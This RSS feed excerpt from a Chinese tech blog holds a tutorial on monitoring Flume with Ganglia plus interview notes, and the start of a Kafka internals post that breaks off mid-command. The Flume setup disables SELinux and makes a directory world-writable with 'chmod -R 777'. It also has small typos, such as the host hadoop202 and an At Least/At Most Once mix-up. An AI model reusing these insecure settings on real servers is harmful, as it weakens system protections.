      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在flume进行数据的采集过程中，有可能会出错，因此我们需要一个系统来监控flume采集的状况。</p><h3 id="1-Ganglia的安装与部署"><a href="#1-Ganglia的安装与部署" class="headerlink" title="1 Ganglia的安装与部署"></a>1 Ganglia的安装与部署</h3><p>Ganglia由gmond、gmetad和gweb三部分组成。</p><p>gmond（Ganglia Monitoring Daemon）是一种轻量级服务，安装在每台需要收集指标数据的节点主机上。使用gmond，你可以很容易收集很多系统指标数据，如CPU、内存、磁盘、网络和活跃进程的数据等。（有flume的主机就要装gmond）</p><p>gmetad（Ganglia Meta Daemon）整合所有信息，并将其以RRD格式存储至磁盘的服务。（在一台机器上安装即可）</p><p>gweb（Ganglia Web）Ganglia可视化工具，gweb是一种利用浏览器显示gmetad所存储数据的PHP前端。在Web界面中以图表方式展现集群的运行状态下收集的多种不同指标数据。（在一台机器上安装即可）</p><p>1）安装ganglia</p><p>  （1）规划</p><p>hadoop102:   gweb gmetad gmod<br>hadoop103:   gmod<br>hadoop104:   gmod</p><p>  （2）在102 103 104分别安装epel-release</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> epel-release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （3）在102 安装三个服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-gmetad <span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-web<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-gmond<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  （4）在103 和 104 安装ganglia-gmond</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-gmond<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）在102修改配置文件/etc/httpd/conf.d/ganglia.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/httpd/conf.d/ganglia.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为红颜色的配置：</p><pre class="line-numbers language-sh"><code class="language-sh"># Ganglia monitoring system php web frontendAlias /ganglia /usr/share/ganglia<Location /ganglia># Require local# 通过windows访问ganglia,需要配置Linux对应的主机(windows)ip地址  Require ip 192.168.202.1  # Require ip 10.1.2.3# Require host example.org</Location><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）在102修改配置文件/etc/ganglia/gmetad.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/ganglia/gmetad.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为：</p><p>data_source “my cluster” hadoop102</p><p>6）在102 103 104修改配置文件/etc/ganglia/gmond.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/ganglia/gmond.conf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为：</p><pre class="line-numbers language-sh"><code class="language-sh">cluster &#123; name = "my cluster" owner = "unspecified" latlong = "unspecified" url = "unspecified"&#125;udp_send_channel &#123;#bind_hostname = yes # Highly recommended, soon to be default.# This option tells gmond to use a source address# that resolves to the machine's hostname. Without# this, the metrics may appear to come from any# interface and the DNS names associated with# those IPs will be used to create the RRDs.# mcast_join = 239.2.11.71# 数据发送给hadoop102 host = hadoop102 port = 8649 ttl = 1&#125;udp_recv_channel &#123;# mcast_join = 239.2.11.71 port = 8649# 接收来自任意连接的数据 bind = 0.0.0.0 retry_bind = true# Size of the UDP buffer. If you are handling lots of metrics you really# should bump it up to e.g. 10MB or even higher.# buffer = 10485760&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）在102修改配置文件/etc/selinux/config</p><pre class="line-numbers language-sh"><code class="language-sh">[molly@hadoop102 flume]$ sudo vim /etc/selinux/config#修改为：# This file controls the state of SELinux on the system.# SELINUX= can take one of these three values:#   enforcing - SELinux security policy is enforced.#   permissive - SELinux prints warnings instead of enforcing.#   disabled - No SELinux policy is loaded.SELINUX=disabled# SELINUXTYPE= can take one of these two values:#   targeted - Targeted processes are protected,#   mls - Multi Level Security protection.SELINUXTYPE=targeted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尖叫提示：selinux本次生效关闭必须重启，如果此时不想重启，可以临时生效之：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> setenforce 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）启动ganglia</p><p>（1）在102 103 104 启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl  start gmond<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）在102 启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl start httpd<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl start gmetad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>9）打开网页浏览ganglia页面</p><p><a href="http://hadoop102/ganglia">http://hadoop102/ganglia</a></p><p>尖叫提示：如果完成以上操作依然出现权限不足错误，请修改/var/lib/ganglia目录的权限：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">chmod</span> -R 777 /var/lib/ganglia<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/bigdata-flume3-monitor/1637069452077.png" alt="1637069452077"></p><h3 id="2-操作Flume测试监控"><a href="#2-操作Flume测试监控" class="headerlink" title="2 操作Flume测试监控"></a>2 操作Flume测试监控</h3><p>1）启动Flume任务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent \-c conf/ \-n a1 \-f datas/netcat-flume-logger.conf \-Dflume.root.logger<span class="token operator">=</span>INFO,console \-Dflume.monitoring.type<span class="token operator">=</span>ganglia \-Dflume.monitoring.hosts<span class="token operator">=</span>hadoop202:8649<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）发送数据观察ganglia监测图</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ nc localhost 44444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>样式如图： <img src="/2020/11/16/bigdata-flume3-monitor/1637069611224.png" alt="1637069611224"></p><p>图例说明：</p><table><thead><tr><th>字段（图表名称）</th><th>字段含义</th></tr></thead><tbody><tr><td>EventPutAttemptCount</td><td>source尝试写入channel的事件总数量</td></tr><tr><td>EventPutSuccessCount</td><td>成功写入channel且提交的事件总数量</td></tr><tr><td>EventTakeAttemptCount</td><td>sink尝试从channel拉取事件的总数量。</td></tr><tr><td>EventTakeSuccessCount</td><td>sink成功读取的事件的总数量</td></tr><tr><td>StartTime</td><td>channel启动的时间（毫秒）</td></tr><tr><td>StopTime</td><td>channel停止的时间（毫秒）</td></tr><tr><td>ChannelSize</td><td>目前channel中事件的总数量</td></tr><tr><td>ChannelFillPercentage</td><td>channel占用百分比</td></tr><tr><td>ChannelCapacity</td><td>channel的容量</td></tr></tbody></table><h3 id="3-企业真实面试题"><a href="#3-企业真实面试题" class="headerlink" title="3 企业真实面试题"></a>3 企业真实面试题</h3><h4 id="3-1-你是如何实现Flume数据传输的监控的"><a href="#3-1-你是如何实现Flume数据传输的监控的" class="headerlink" title="3.1 你是如何实现Flume数据传输的监控的"></a>3.1 你是如何实现Flume数据传输的监控的</h4><p>使用第三方框架Ganglia实时监控Flume。</p><h4 id="3-2-Flume的Source，Sink，Channel的作用？你们Source是什么类型？"><a href="#3-2-Flume的Source，Sink，Channel的作用？你们Source是什么类型？" class="headerlink" title="3.2 Flume的Source，Sink，Channel的作用？你们Source是什么类型？"></a>3.2 Flume的Source，Sink，Channel的作用？你们Source是什么类型？</h4><p>1）作用</p><p>（1）Source组件是专门用来收集数据的，可以处理各种类型、各种格式的日志数据，包括avro、thrift、exec、jms、spooling directory、netcat、sequence generator、syslog、http、legacy</p><p>（2）Channel组件对采集到的数据进行缓存，可以存放在Memory或File中。</p><p>（3）Sink组件是用于把数据发送到目的地的组件，目的地包括Hdfs、Logger、avro、thrift、ipc、file、Hbase、solr、自定义。</p><p>2）我公司采用的Source类型为：</p><p>（1）监控后台日志：exec</p><p>（2）监控后台产生日志的端口：netcat</p><h4 id="3-3-Flume的Channel-Selectors"><a href="#3-3-Flume的Channel-Selectors" class="headerlink" title="3.3 Flume的Channel Selectors"></a>3.3 Flume的Channel Selectors</h4><p><img src="/2020/11/16/bigdata-flume3-monitor/1637070079570.png" alt="1637070079570"></p><h4 id="3-4-Flume参数调优"><a href="#3-4-Flume参数调优" class="headerlink" title="3.4 Flume参数调优"></a>3.4 Flume参数调优</h4><p>1）Source</p><p>增加Source个（使用Tair Dir Source时可增加FileGroups个数）可以增大Source的读取数据的能力。例如：当某一个目录产生的文件过多时需要将这个文件目录拆分成多个文件目录，同时配置好多个Source 以保证Source有足够的能力获取到新产生的数据。</p><p>batchSize参数决定Source一次批量运输到Channel的event条数，适当调大这个参数可以提高Source搬运Event到Channel时的性能。</p><p>2）Channel </p><p>type 选择memory时Channel的性能最好，但是如果Flume进程意外挂掉可能会丢失数据。type选择file时Channel的容错性更好，但是性能上会比memory channel差。</p><p>使用file Channel时dataDirs配置多个不同盘下的目录可以提高性能。</p><p>Capacity 参数决定Channel可容纳最大的event条数。transactionCapacity 参数决定每次Source往channel里面写的最大event条数和每次Sink从channel里面读的最大event条数。transactionCapacity需要大于Source和Sink的batchSize参数。</p><p>3）Sink </p><p>增加Sink的个数可以增加Sink消费event的能力。Sink也不是越多越好够用就行，过多的Sink会占用系统资源，造成系统资源不必要的浪费。</p><p>batchSize参数决定Sink一次批量从Channel读取的event条数，适当调大这个参数可以提高Sink从Channel搬出event的性能。</p><h4 id="3-5-Flume的事务机制"><a href="#3-5-Flume的事务机制" class="headerlink" title="3.5 Flume的事务机制"></a>3.5 Flume的事务机制</h4><p>Flume的事务机制（类似数据库的事务机制）：Flume使用两个独立的事务分别负责从Soucrce到Channel，以及从Channel到Sink的事件传递。比如spooling directory source 为文件的每一行创建一个事件，一旦事务中所有的事件全部传递到Channel且提交成功，那么Soucrce就将该文件标记为完成。同理，事务以类似的方式处理从Channel到Sink的传递过程，如果因为某种原因使得事件无法记录，那么事务将会回滚。且所有的事件都会保持到Channel中，等待重新传递。</p><h4 id="3-6-Flume采集数据会丢失吗"><a href="#3-6-Flume采集数据会丢失吗" class="headerlink" title="3.6 Flume采集数据会丢失吗?"></a>3.6 Flume采集数据会丢失吗?</h4><p>根据Flume的架构原理，Flume是不可能丢失数据的，其内部有完善的事务机制，Source到Channel是事务性的，Channel到Sink是事务性的，因此这两个环节不会出现数据的丢失，唯一可能丢失数据的情况是Channel采用memoryChannel，agent宕机导致数据丢失，或者Channel存储数据已满，导致Source不再写入，未写入的数据丢失。</p><p>Flume不会丢失数据，但是有可能造成数据的重复，例如数据已经成功由Sink发出，但是没有接收到响应，Sink会再次发送数据，此时可能会导致数据的重复。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/flume/">flume</category>
      
      
      <comments>https://m01ly.github.io/2020/11/16/bigdata-flume3-monitor/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（二） kafka框架深入</title>
      <link>https://m01ly.github.io/2020/11/16/bigdata-kafka2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/16/bigdata-kafka2-framework/</guid>
      <pubDate>Sun, 15 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Kafka工作流程及文件存储机制"><a href="#1-Kafka工作流程及文件存储机制" class="headerlink" title="1 Kafka工作流程及文件存储机制"></a>1 Kafka工作流程及文件存储机制</h2><p>​                                <img src="/2020/11/16/bigdata-kafka2-framework/1637307083407.png" alt="1637307083407"></p><p>Kafka中消息是以topic进行分类的，生产者生产消息，消费者消费消息，都是面向topic的。</p><p>topic是逻辑上的概念，而partition是物理上的概念，每个partition对应于一个log文件，该log文件中存储的就是producer生产的数据。Producer生产的数据会被不断追加到该log文件末端，且每条数据都有自己的offset。消费者组中的每个消费者，都会实时记录自己消费到了哪个offset，以便出错恢复时，从上次的位置继续消费。</p><p>   <img src="/2020/11/16/bigdata-kafka2-framework/1637307135597.png" alt="1637307135597"></p><p>由于生产者生产的消息会不断追加到log文件末尾，为防止log文件过大导致数据定位效率低下，Kafka采取了分片和索引机制，将每个partition分为多个segment。每个segment对应两个文件——“.index”文件和“.log”文件。这些文件位于一个文件夹下，该文件夹的命名规则为：topic名称+分区序号。例如，first这个topic有三个分区，则其对应的文件夹为first-0,first-1,first-2。</p><p>00000000000000000000.index<br>00000000000000000000.log<br>00000000000000170410.index<br>00000000000000170410.log<br>00000000000000239430.index<br>00000000000000239430.log</p><p>index和log文件以当前segment的第一条消息的offset命名。下图为index文件和log文件的结构示意图。<img src="/2020/11/16/bigdata-kafka2-framework/1637307198786.png" alt="1637307198786"></p><p>“.index”文件存储大量的索引信息，“.log”文件存储大量的数据，索引文件中的元数据指向对应数据文件中message的物理偏移地址。</p><h2 id="2-Kafka生产者"><a href="#2-Kafka生产者" class="headerlink" title="2 Kafka生产者"></a>2 Kafka生产者</h2><h3 id="2-1-分区策略"><a href="#2-1-分区策略" class="headerlink" title="2.1 分区策略"></a>2.1 分区策略</h3><p>1）分区的原因</p><p>（1）方便在集群中扩展，每个Partition可以通过调整以适应它所在的机器，而一个topic又可以有多个Partition组成，因此整个集群就可以适应任意大小的数据了；</p><p>（2）可以提高并发，因为可以以Partition为单位读写了。</p><p>2）分区的原则</p><p>我们需要将producer发送的数据封装成一个ProducerRecord对象。</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307258903.png" alt="1637307258903"></p><p>（1）  指明 partition 的情况下，直接将指明的值直接作为 partiton 值；</p><p>（2） 没有指明 partition 值但有 key 的情况下，将 key 的 hash 值与 topic 的 partition 数进行取余得到 partition 值；</p><p>（3）  既没有 partition 值又没有 key 值的情况下， kafka采用Sticky Partition(黏性分区器)，会随机选择一个分区，并尽可能一直使用该分区，待该分区的batch已满或者已完成，kafka再随机一个分区进行使用.</p><h3 id="2-2-数据可靠性保证"><a href="#2-2-数据可靠性保证" class="headerlink" title="2.2 数据可靠性保证"></a>2.2 数据可靠性保证</h3><p>1）生产者发送数据到topic partition的可靠性保证</p><p>为保证producer发送的数据，能可靠的发送到指定的topic，topic的每个partition收到producer发送的数据后，都需要向producer发送ack（acknowledgement确认收到），如果producer收到ack，就会进行下一轮的发送，否则重新发送数据。</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307286958.png" alt="1637307286958"></p><p>2）Topic partition存储数据的可靠性保证</p><p>（1）副本数据同步策略</p><table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>半数以上完成同步，就发送ack</td><td>延迟低</td><td>选举新的leader时，容忍n台节点的故障，需要2n+1个副本</td></tr><tr><td>全部完成同步，才发送ack</td><td>选举新的leader时，容忍n台节点的故障，需要n+1个副本</td><td>延迟高</td></tr></tbody></table><p>Kafka选择了第二种方案，原因如下：</p><p>\1. 同样为了容忍n台节点的故障，第一种方案需要2n+1个副本，而第二种方案只需要n+1个副本，而Kafka的每个分区都有大量的数据，第一种方案会造成大量数据的冗余。</p><p>\2. 虽然第二种方案的网络延迟会比较高，但网络延迟对Kafka的影响较小。</p><p>（2）ISR</p><p>​    采用第二种方案之后，设想以下情景：leader收到数据，所有follower都开始同步数据，但有一个follower，因为某种故障，迟迟不能与leader进行同步，那leader就要一直等下去，直到它完成同步，才能发送ack。这个问题怎么解决呢？</p><p>​    Leader维护了一个动态的in-sync replica set (ISR)，意为和leader保持同步的follower集合。当ISR中的follower完成数据的同步之后，leader就会给producer发送ack。如果follower长时间未向leader同步数据，则该follower将被踢出ISR，该时间阈值由replica.lag.time.max.ms参数设定。Leader发生故障之后，就会从ISR中选举新的leader。</p><p>（3）ack应答级别</p><p>对于某些不太重要的数据，对数据的可靠性要求不是很高，能够容忍数据的少量丢失，所以没必要等ISR中的follower全部接收成功。</p><p>所以Kafka为用户提供了三种可靠性级别，用户根据对可靠性和延迟的要求进行权衡，选择以下的配置。</p><p>acks参数配置：</p><p>acks：</p><p>0：这一操作提供了一个最低的延迟，partition的leader接收到消息还没有写入磁盘就已经返回ack，当leader故障时有可能丢失数据；</p><p>1： partition的leader落盘成功后返回ack，如果在follower同步成功之前leader故障，那么将会丢失数据；</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307342461.png" alt="1637307342461"></p><p>-1（all）： partition的leader和follower全部落盘成功后才返回ack。但是如果在follower同步完成后，broker发送ack之前，leader发生故障，那么会造成数据重复。</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307384900.png" alt="1637307384900"></p><p>3）leader和 follower故障处理细节</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307411343.png" alt="1637307411343"></p><p>LEO：指的是每个副本最大的offset；</p><p>HW：指的是消费者能见到的最大的offset，ISR队列中最小的LEO。</p><p>（1）follower故障</p><p>follower发生故障后会被临时踢出ISR，待该follower恢复后，follower会读取本地磁盘记录的上次的HW，并将log文件高于HW的部分截取掉，从HW开始向leader进行同步。等该follower的LEO大于等于该Partition的HW，即follower追上leader之后，就可以重新加入ISR了。</p><p>（2）leader故障</p><p>leader发生故障之后，会从ISR中选出一个新的leader，之后，为保证多个副本之间的数据一致性，其余的follower会先将各自的log文件高于HW的部分截掉，然后从新的leader同步数据。</p><p>注意：这只能保证副本之间的数据一致性，并不能保证数据不丢失或者不重复。</p><h3 id="2-3-Exactly-Once语义"><a href="#2-3-Exactly-Once语义" class="headerlink" title="2.3 Exactly Once语义"></a>2.3 Exactly Once语义</h3><p>​    将服务器的ACK级别设置为-1，可以保证Producer到Server之间不会丢失数据，即At Least Once语义。相对的，将服务器ACK级别设置为0，可以保证生产者每条消息只会被发送一次，即At Most Once语义。</p><p>​    At Least Once可以保证数据不丢失，但是不能保证数据不重复；相对的，At Least Once可以保证数据不重复，但是不能保证数据不丢失。但是，对于一些非常重要的信息，比如说交易数据，下游数据消费者要求数据既不重复也不丢失，即Exactly Once语义。在0.11版本以前的Kafka，对此是无能为力的，只能保证数据不丢失，再在下游消费者对数据做全局去重。对于多个下游应用的情况，每个都需要单独做全局去重，这就对性能造成了很大影响。</p><p>0.11版本的Kafka，引入了一项重大特性：幂等性。所谓的幂等性就是指Producer不论向Server发送多少次重复数据，Server端都只会持久化一条。幂等性结合At Least Once语义，就构成了Kafka的Exactly Once语义。即：At Least Once + 幂等性 = Exactly Once</p><p>​    要启用幂等性，只需要将Producer的参数中enable.idempotence设置为true即可。Kafka的幂等性实现其实就是将原来下游需要做的去重放在了数据上游。开启幂等性的Producer在初始化的时候会被分配一个PID，发往同一Partition的消息会附带Sequence Number。而Broker端会对&lt;PID, Partition, SeqNumber&gt;做缓存，当具有相同主键的消息提交时，Broker只会持久化一条。</p><p>但是PID重启就会变化，同时不同的Partition也具有不同主键，所以幂等性无法保证跨分区跨会话的Exactly Once。</p><h2 id="3-Kafka消费者"><a href="#3-Kafka消费者" class="headerlink" title="3 Kafka消费者"></a>3 Kafka消费者</h2><h3 id="3-1-消费方式"><a href="#3-1-消费方式" class="headerlink" title="3.1 消费方式"></a>3.1 消费方式</h3><p>consumer采用pull（拉）模式从broker中读取数据。</p><p>push（推）模式很难适应消费速率不同的消费者，因为消息发送速率是由broker决定的。它的目标是尽可能以最快速度传递消息，但是这样很容易造成consumer来不及处理消息，典型的表现就是拒绝服务以及网络拥塞。而pull模式则可以根据consumer的消费能力以适当的速率消费消息。</p><p>pull模式不足之处是，如果kafka没有数据，消费者可能会陷入循环中，一直返回空数据。针对这一点，Kafka的消费者在消费数据时会传入一个时长参数timeout，如果当前没有数据可供消费，consumer会等待一段时间之后再返回，这段时长即为timeout。</p><h3 id="3-2-分区分配策略"><a href="#3-2-分区分配策略" class="headerlink" title="3.2 分区分配策略"></a>3.2 分区分配策略</h3><p>一个consumer group中有多个consumer，一个 topic有多个partition，所以必然会涉及到partition的分配问题，即确定那个partition由哪个consumer来消费。</p><p>Kafka有三种分配策略，RoundRobin，Range , Sticky。</p><p>1）RoundRobin</p><p>RoundRobinAssignor策略的原理是将消费组内所有消费者以及消费者所订阅的所有topic的partition按照字典序排序，然后通过轮询方式逐个将分区以此分配给每个消费者。<br>如果同一个消费组内所有的消费者的订阅信息都是相同的，那么RoundRobinAssignor策略的分区分配会是均匀的。举例，假设消费组中有2个消费者C0和C1，都订阅了主题t0和t1，并且每个主题都有3个分区，那么所订阅的所有分区可以标识为：t0p0、t0p1、t0p2、t1p0、t1p1、t1p2。最终的分配结果为：<br>消费者C0：t0p0、t0p2、t1p1<br>消费者C1：t0p1、t1p0、t1p2<br>如果同一个消费组内的消费者所订阅的信息是不相同的，那么在执行分区分配的时候就不是完全的轮询分配，有可能会导致分区分配的不均匀。如果某个消费者没有订阅消费组内的某个topic，那么在分配分区的时候此消费者将分配不到这个topic的任何分区。<br>举例，假设消费组内有3个消费者C0、C1和C2，它们共订阅了3个主题：t0、t1、t2，这3个主题分别有1、2、3个分区，即整个消费组订阅了t0p0、t1p0、t1p1、t2p0、t2p1、t2p2这6个分区。具体而言，消费者C0订阅的是主题t0，消费者C1订阅的是主题t0和t1，消费者C2订阅的是主题t0、t1和t2，那么最终的分配结果为：<br>消费者C0：t0p0<br>消费者C1：t1p0<br>消费者C2：t1p1、t2p0、t2p1、t2p2 </p><p>2）Range 默认的</p><p>RangeAssignor策略的原理是按照消费者总数和分区总数进行整除运算来获得一个跨度，然后将分区按照跨度进行平均分配，以保证分区尽可能均匀地分配给所有的消费者。对于每一个topic，RangeAssignor策略会将消费组内所有订阅这个topic的消费者按照名称的字典序排序，然后为每个消费者划分固定的分区范围，如果不够平均分配，那么字典序靠前的消费者会被多分配一个分区。</p><p>可以明显的看到这样的分配并不均匀，如果将类似的情形扩大，有可能会出现部分消费者过载的情况。对此我们再来看下另一种RoundRobinAssignor策略的分配效果如何。</p><p>3） StickyAssignor分配策略</p><p>我们再来看一下StickyAssignor策略，“sticky”这个单词可以翻译为“粘性的”，Kafka从0.11.x版本开始引入这种分配策略，它主要有两个目的：<br>分区的分配要尽可能的均匀；<br>分区的分配尽可能的与上次分配的保持相同。<br>当两者发生冲突时，第一个目标优先于第二个目标。鉴于这两个目标，StickyAssignor策略的具体实现要比RangeAssignor和RoundRobinAssignor这两种分配策略要复杂很多。我们举例来看一下StickyAssignor策略的实际效果。<br>举例，同样消费组内有3个消费者：C0、C1和C2，集群中有3个主题：t0、t1和t2，这3个主题分别有1、2、3个分区，也就是说集群中有t0p0、t1p0、t1p1、t2p0、t2p1、t2p2这6个分区。消费者C0订阅了主题t0，消费者C1订阅了主题t0和t1，消费者C2订阅了主题t0、t1和t2。<br>消费者C0：t0p0<br>消费者C1：t1p0、t1p1<br>消费者C2：t2p0、t2p1、t2p2<br>可以看到这是一个最优解（消费者C0没有订阅主题t1和t2，所以不能分配主题t1和t2中的任何分区给它，对于消费者C1也可同理推断）。<br>假如此时消费者C0脱离了消费组，那么RoundRobinAssignor策略的分配结果为：<br>消费者C1：t0p0、t1p1<br>消费者C2：t1p0、t2p0、t2p1、t2p2<br>可以看到RoundRobinAssignor策略保留了消费者C1和C2中原有的3个分区的分配：t2p0、t2p1和t2p2（针对结果集1）。而如果采用的是StickyAssignor策略，那么分配<br>消费者C1：t1p0、t1p1、t0p0<br>消费者C2：t2p0、t2p1、t2p2<br>可以看到StickyAssignor策略保留了消费者C1和C2中原有的5个分区的分配：t1p0、t1p1、t2p0、t2p1、t2p2。<br>从结果上看StickyAssignor策略比另外两者分配策略而言显得更加的优异，这个策略的代码实现也是异常复杂，如果读者没有接触过这种分配策略，不妨使用一下来尝尝鲜。</p><p>1.同一个Consumer Group内新增或减少Consumer<br>2.Topic分区发生变化</p><h3 id="3-3-offset的维护"><a href="#3-3-offset的维护" class="headerlink" title="3.3 offset的维护"></a>3.3 offset的维护</h3><p>由于consumer在消费过程中可能会出现断电宕机等故障，consumer恢复后，需要从故障前的位置的继续消费，所以consumer需要实时记录自己消费到了哪个offset，以便故障恢复后继续消费。</p><p>Kafka 0.9版本之前，consumer默认将offset保存在Zookeeper中，从0.9版本开始，consumer默认将offset保存在Kafka一个内置的topic中，该topic为__consumer_offsets。</p><p>1）消费offset案例</p><p>（0）思想: __consumer_offsets 为kafka中的topic， 那就可以通过消费者进行消费.</p><p>（1）修改配置文件consumer.properties</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 不排除内部的topic</span>exclude.internal.topics<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）创建一个topic</p><pre class="line-numbers language-bash"><code class="language-bash">bin/kafka-topics.sh --create --topic molly --zookeeper hadoop102:2181 --partitions 2 --replication-factor 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）启动生产者和消费者，分别往molly生产数据和消费数据</p><pre class="line-numbers language-bash"><code class="language-bash">bin/kafka-console-producer.sh --topic molly --broker-list hadoop102:9092bin/kafka-console-consumer.sh --consumer.config config/consumer.properties --topic molly --bootstrap-server hadoop102:9092<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）消费offset</p><pre class="line-numbers language-bash"><code class="language-bash">bin/kafka-console-consumer.sh --topic __consumer_offsets --bootstrap-server  hadoop102:9092 --formatter <span class="token string">"kafka.coordinator.group.GroupMetadataManager\<span class="token variable">$OffsetsMessageFormatter</span>"</span> --consumer.config config/consumer.properties --from-beginning<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）消费到的数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>test-consumer-group,molly,1<span class="token punctuation">]</span>::OffsetAndMetadata<span class="token punctuation">(</span>offset<span class="token operator">=</span>2, leaderEpoch<span class="token operator">=</span>Optional<span class="token punctuation">[</span>0<span class="token punctuation">]</span>, metadata<span class="token operator">=</span>, commitTimestamp<span class="token operator">=</span>1591935656078, expireTimestamp<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">[</span>test-consumer-group,molly,0<span class="token punctuation">]</span>::OffsetAndMetadata<span class="token punctuation">(</span>offset<span class="token operator">=</span>1, leaderEpoch<span class="token operator">=</span>Optional<span class="token punctuation">[</span>0<span class="token punctuation">]</span>, metadata<span class="token operator">=</span>, commitTimestamp<span class="token operator">=</span>1591935656078, expireTimestamp<span class="token operator">=</span>None<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-4-消费者组案例"><a href="#3-4-消费者组案例" class="headerlink" title="3.4 消费者组案例"></a>3.4 消费者组案例</h3><p>1）需求：测试同一个消费者组中的消费者，同一时刻只能有一个消费者消费。</p><p>2）案例实操</p><p>​    （1）在hadoop102、hadoop103上修改/opt/module/kafka/config/consumer.properties配置文件中的group.id属性为任意组名。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop103 config<span class="token punctuation">]</span>$ <span class="token function">vi</span> consumer.propertiesgroup.id<span class="token operator">=</span>mygroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （2）在hadoop104上启动生产者</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span> molly hadoop104 kafka<span class="token punctuation">]</span>$ 